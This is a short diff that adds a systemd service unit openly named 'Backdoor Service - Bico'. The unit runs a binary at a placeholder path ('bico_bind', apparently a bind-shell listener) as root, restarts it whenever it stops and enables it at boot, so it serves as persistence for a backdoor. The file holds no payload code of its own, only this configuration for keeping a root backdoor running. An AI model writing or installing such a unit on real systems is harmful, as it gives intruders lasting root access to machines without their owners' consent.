@@ -1,0 +1,15 @@
+[Unit]
+Description=Backdoor Service - Bico
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/caminho/para/bico_bind
+Restart=always
+User=root
+StandardOutput=journal
+StandardError=journal
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
